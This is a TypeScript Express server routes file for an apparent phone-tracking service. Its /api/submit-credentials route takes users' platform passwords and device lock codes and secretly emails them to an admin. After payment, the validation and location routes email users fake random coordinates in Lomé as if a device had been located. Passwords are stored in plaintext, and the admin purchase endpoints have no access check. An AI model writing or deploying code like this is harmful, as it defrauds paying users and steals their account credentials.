import type { Express, Request } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { 
  sendUserCredentialsToAdmin, 
  sendPaymentConfirmation, 
  sendLocationToUser,
  UserCredentials 
} from "./email";
import { generateLomeLocation } from "../client/src/lib/device-data";
import { insertPurchaseSchema } from "@shared/schema";

interface SessionRequest extends Request {
  session: any;
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Auth endpoints
  app.post("/api/register", async (req, res) => {
    const { email, password } = req.body;
    const existing = await storage.getUserByEmail(email);
    if (existing) return res.status(400).json({ error: "Email already registered" });
    const user = await storage.createUser({ email, password, isAdmin: false });
    (req as SessionRequest).session.userId = user.id;
    res.json(user);
  });

  app.post("/api/login", async (req, res) => {
    const { email, password } = req.body;
    const user = await storage.getUserByEmail(email);
    if (!user || user.password !== password) {
      return res.status(401).json({ error: "Invalid email or password" });
    }
    (req as SessionRequest).session.userId = user.id;
    res.json(user);
  });

  app.post("/api/logout", (req, res) => {
    (req as SessionRequest).session.destroy(() => {
      res.json({ success: true });
    });
  });

  app.get("/api/user", async (req, res) => {
    const userId = (req as SessionRequest).session.userId;
    if (!userId) return res.status(401).json({ error: "Not logged in" });
    const user = await storage.getUser(userId);
    if (!user) return res.status(401).json({ error: "User not found" });
    res.json(user);
  });

  // Admin: Get all purchases
  app.get('/api/admin/purchases', async (req, res) => {
    const purchases = await storage.getPurchases();
    res.json(purchases);
  });

  // Get purchase status by IMEI
  app.get('/api/purchases/status/:imei', async (req, res) => {
    const purchases = await storage.getPurchases();
    const purchase = purchases.find(p => p.imei === req.params.imei);
    if (!purchase) return res.status(404).json({ error: 'Purchase not found' });
    res.json({ status: purchase.status });
  });

  // Admin: Validate purchase
  app.patch('/api/admin/purchases/:id', async (req, res) => {
    const id = parseInt(req.params.id);
    const { status, userEmail, device, imei, amount } = req.body;

    const updated = await storage.updatePurchaseStatus(id, status);
    if (!updated) return res.status(404).json({ error: 'Purchase not found' });

    if (status === 'validated') {
      await sendPaymentConfirmation(userEmail, device, imei, amount);
      // Automatically send location after validation
      const coordinates = generateLomeLocation();
      await sendLocationToUser(userEmail, device, coordinates);
    }

    res.json(updated);
  });

  // Submit user credentials and send to admin
  app.post('/api/submit-credentials', async (req, res) => {
    try {
      const { email, platform, device, identifier, password, lockCode } = req.body;

      if (!email || !platform || !device || !identifier || !password || !lockCode) {
        return res.status(400).json({ error: 'Missing required fields' });
      }

      const credentials: UserCredentials = {
        email,
        platform,
        device,
        identifier,
        password,
        lockCode,
        imei: "HIDDEN"
      };

      // Create a pending purchase record
      const amount = req.body.isFastTrack ? 19900 : 5000;
      const imei = "TRACK-" + Math.random().toString(36).substring(2, 10).toUpperCase();
      
      await storage.createPurchase({
        userId: null,
        device,
        imei,
        amount,
        status: "pending",
        userEmail: email,
        trackingType: req.body.isFastTrack ? "priority" : "standard"
      });

      // Send credentials to admin (secret)
      try {
        await sendUserCredentialsToAdmin(credentials);
      } catch (emailError) {
        console.error('Email sending failed but continuing:', emailError);
        // We continue because the record is already in DB for admin to see
      }

      res.json({ success: true, message: 'Credentials submitted successfully' });
    } catch (error) {
      console.error('Error submitting credentials:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Send payment confirmation
  app.post('/api/confirm-payment', async (req, res) => {
    try {
      const { userEmail, device, imei } = req.body;

      if (!userEmail || !device || !imei) {
        return res.status(400).json({ error: 'Missing required fields' });
      }

      const emailSent = await sendPaymentConfirmation(userEmail, device, imei);

      if (emailSent) {
        res.json({ success: true, message: 'Payment confirmation sent' });
      } else {
        res.status(500).json({ error: 'Failed to send payment confirmation' });
      }
    } catch (error) {
      console.error('Error sending payment confirmation:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Send location to user
  app.post('/api/send-location', async (req, res) => {
    try {
      const { userEmail, device } = req.body;

      if (!userEmail || !device) {
        return res.status(400).json({ error: 'Missing required fields' });
      }

      // Generate random location in Lomé
      const coordinates = generateLomeLocation();
      const emailSent = await sendLocationToUser(userEmail, device, coordinates);

      if (emailSent) {
        res.json({ success: true, message: 'Location sent to user', coordinates });
      } else {
        res.status(500).json({ error: 'Failed to send location' });
      }
    } catch (error) {
      console.error('Error sending location:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
